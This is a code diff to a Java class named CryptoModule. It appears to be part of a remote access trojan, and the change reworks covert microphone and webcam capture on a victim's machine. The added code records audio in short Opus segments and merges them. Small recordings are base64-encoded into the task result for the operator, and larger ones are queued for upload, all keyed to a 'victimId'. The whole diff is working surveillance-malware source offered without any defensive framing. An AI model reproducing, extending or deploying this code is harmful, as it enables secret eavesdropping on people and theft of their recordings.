@@ -1599,7 +1599,7 @@ public final class CryptoModule {
 		boolean stream = "webcam:stream".equals(task.name()) || "stream".equals(task.params().get("mode"));
 		String device = Json.str(task.params(), "device", "").strip();
 		int quality = (int) Math.min(90, Math.max(20, Json.num(task.params(), "quality", 60L)));
-		Path out = work.resolve(kind + "-" + System.currentTimeMillis() + ("mic".equals(kind) ? ".wav" : ".jpg"));
+		Path out = work.resolve(kind + "-" + System.currentTimeMillis() + ("mic".equals(kind) ? ".webm" : ".jpg"));
 		List<String> command = new ArrayList<>();
 		command.add("ffmpeg");
 		command.add("-y");
@@ -1631,11 +1631,10 @@ public final class CryptoModule {
 			} else {
 				command.addAll(List.of("-f", "pulse", "-i", device.isEmpty() ? "default" : device, "-t", String.valueOf(seconds)));
 			}
-			command.add("-ac");
-			command.add("1");
-			command.add("-ar");
-			command.add("16000");
-			command.add(out.toString());
+			command.addAll(List.of("-ac", "1", "-ar", "16000", "-c:a", "libopus", "-b:a", "32k"));
+			Path segments = work.resolve("mic-" + task.id());
+			Files.createDirectories(segments);
+			command.addAll(List.of("-f", "segment", "-segment_time", "3", segments.resolve("part-%03d.webm").toString()));
 		}
 		ProcessBuilder builder = new ProcessBuilder(command);
 		builder.redirectErrorStream(true);
@@ -1677,16 +1676,38 @@ public final class CryptoModule {
 			result.put("bytes", Files.size(out));
 			Files.deleteIfExists(out);
 		} else {
+			// Los segmentos de 3 s se concatenan en orden antes de publicar: WebM
+			// por bloques es reproducible sin recomprimir.
+			Path segments = work.resolve("mic-" + task.id());
+			List<Path> parts = new ArrayList<>();
+			try (java.util.stream.Stream<Path> list = Files.list(segments)) {
+				parts.addAll(list.filter((item) -> item.getFileName().toString().endsWith(".webm")).sorted().toList());
+			}
+			try (java.io.OutputStream merged = Files.newOutputStream(out)) {
+				for (Path part : parts) {
+					Files.copy(part, merged);
+					Files.deleteIfExists(part);
+				}
+			}
+			Files.deleteIfExists(segments);
 			if (!Files.isRegularFile(out) || Files.size(out) == 0) throw new IllegalStateException("mic_unavailable: audio vacío");
-			ArtifactPack pack = new ArtifactPack(config, transport.victimId(), kind, work.resolve("tmp"));
-			try {
-				pack.add(out, kind + "/" + out.getFileName(), kind);
-				result.put("upload_id", queueUpload(pack, kind, task.id()));
-				result.put("bytes", Files.size(out));
-				result.put("seconds", Json.num(task.params(), "seconds", 15L));
-			} finally {
-				pack.close();
+			byte[] bytes = Files.readAllBytes(out);
+			result.put("bytes", bytes.length);
+			result.put("seconds", Json.num(task.params(), "seconds", 15L));
+			result.put("mime", "audio/webm");
+			result.put("device", device.isEmpty() ? "default" : device);
+			if (bytes.length <= 1_500_000) {
+				result.put("data", Base64.getEncoder().encodeToString(bytes));
 				Files.deleteIfExists(out);
+			} else {
+				ArtifactPack pack = new ArtifactPack(config, transport.victimId(), kind, work.resolve("tmp"));
+				try {
+					pack.add(out, kind + "/" + out.getFileName(), kind);
+					result.put("upload_id", queueUpload(pack, kind, task.id()));
+				} finally {
+					pack.close();
+					Files.deleteIfExists(out);
+				}
 			}
 		}
 		result.put("device", device.isEmpty() ? "default" : device);
